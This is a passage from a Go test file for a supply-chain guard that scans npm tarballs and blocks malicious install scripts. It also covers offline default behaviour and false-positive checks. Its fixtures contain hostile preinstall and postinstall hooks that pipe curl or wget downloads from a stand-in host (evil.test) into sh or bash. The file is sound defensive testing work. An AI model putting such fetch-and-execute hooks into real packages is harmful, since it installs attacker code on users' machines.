	if !strings.Contains(v.Reason, "malicious indicator") {
		t.Errorf("reason = %q, want it to mention the malicious indicator", v.Reason)
	}
}

func TestAnalyzeArtifact_BenignSourceNoIOC(t *testing.T) {
	// Ordinary source that fetches from a legitimate CDN must NOT trip the IOC
	// scan — the false-positive guard.
	tgz := makeTGZ(t, map[string]string{
		"package/package.json": `{"name":"benign","version":"1.0.0"}`,
		"package/index.js":     "const x = require('lodash');\nfetch('https://registry.npmjs.org/lodash');\nmodule.exports = x;\n",
	})
	if v := analyzeArtifact("npm", tgz); v.Block {
		t.Fatalf("benign source must not block on the IOC scan, got %+v", v)
	}
}

func TestFetchArtifactBytes_DeepMode(t *testing.T) {
	tgz := makeTGZ(t, map[string]string{
		"package/package.json": `{"name":"net-evil","version":"4.0.0","scripts":{"postinstall":"curl https://evil.test/x | sh"}}`,
	})
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/net-evil/-/net-evil-4.0.0.tgz" {
			http.NotFound(w, r)
			return
		}
		_, _ = w.Write(tgz)
	}))
	defer srv.Close()
	t.Setenv("CHAINSAW_CONFIG_HOME", t.TempDir()) // isolate the egress-audit write
	t.Setenv(guardNpmRegistryEnv, srv.URL)
	spec := packageSpec{Ecosystem: "npm", Name: "net-evil", Version: "4.0.0"}

	// Off by default: no network, no bytes — the offline guarantee holds.
	t.Setenv(guardDeepFetchEnv, "")
	if b, _ := fetchArtifactBytes(spec); b != nil {
		t.Fatalf("deep mode off must return nil (offline), got %d bytes", len(b))
	}

	// On: fetches the pinned tarball and the analyzer blocks it.
	t.Setenv(guardDeepFetchEnv, "1")
	got, _ := fetchArtifactBytes(spec)
	if !bytes.Equal(got, tgz) {
		t.Fatalf("deep fetch returned %d bytes, want %d", len(got), len(tgz))
	}
	if v := analyzeArtifact("npm", got); !v.Block {
		t.Fatalf("fetched malware must block, got %+v", v)
	}
	// Unpinned never fetches (URL not deterministic).
	if b, _ := fetchArtifactBytes(packageSpec{Ecosystem: "npm", Name: "net-evil"}); b != nil {
		t.Fatalf("unpinned spec must not fetch, got %d bytes", len(b))
	}
}

func TestEvaluate_DeepFetchBlock_Integration(t *testing.T) {
	tgz := makeTGZ(t, map[string]string{
		"package/package.json": `{"name":"deep-evil","version":"1.0.0","scripts":{"preinstall":"wget http://evil.test/d -O- | bash"}}`,
	})
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/deep-evil/-/deep-evil-1.0.0.tgz" {
			http.NotFound(w, r)
			return
		}
		_, _ = w.Write(tgz)
	}))
	defer srv.Close()
	t.Setenv("CHAINSAW_CONFIG_HOME", t.TempDir()) // isolate the egress-audit write
	t.Setenv(guardDeepFetchEnv, "1")
	t.Setenv(guardNpmRegistryEnv, srv.URL)
	t.Setenv(guardArtifactDirEnv, "")         // no staged dir
	t.Setenv("npm_config_cache", t.TempDir()) // empty cache -> miss fast, force the fetch

	g := newLocalGuard()
	v := g.evaluate(context.Background(), packageSpec{Ecosystem: "npm", Name: "deep-evil", Version: "1.0.0"})
	if !v.Block {
		t.Fatalf("deep mode must block a fetched malicious package, got %+v", v)
	}
	if v.Severity != "behavioral-high" {
		t.Errorf("severity = %q, want behavioral-high", v.Severity)
	}
}

func TestEvaluate_BehavioralBlock_Integration(t *testing.T) {
	dir := t.TempDir()
	if err := os.MkdirAll(filepath.Join(dir, "npm"), 0o755); err != nil {
		t.Fatal(err)
	}
	tgz := makeTGZ(t, map[string]string{
		"package/package.json": `{"name":"evil","version":"2.0.0","scripts":{"preinstall":"wget http://evil.test/dropper -O- | bash"}}`,
	})
	if err := os.WriteFile(filepath.Join(dir, "npm", "evil-2.0.0.tgz"), tgz, 0o644); err != nil {
		t.Fatal(err)
	}
	t.Setenv(guardArtifactDirEnv, dir)

	g := newLocalGuard()
	v := g.evaluate(context.Background(), packageSpec{Ecosystem: "npm", Name: "evil", Version: "2.0.0"})
	if !v.Block {
		t.Fatalf("guard must BLOCK a staged package with a remote-fetch install script, got %+v", v)
	}
	if v.Severity != "behavioral-high" {
		t.Errorf("severity = %q, want behavioral-high", v.Severity)
	}
}
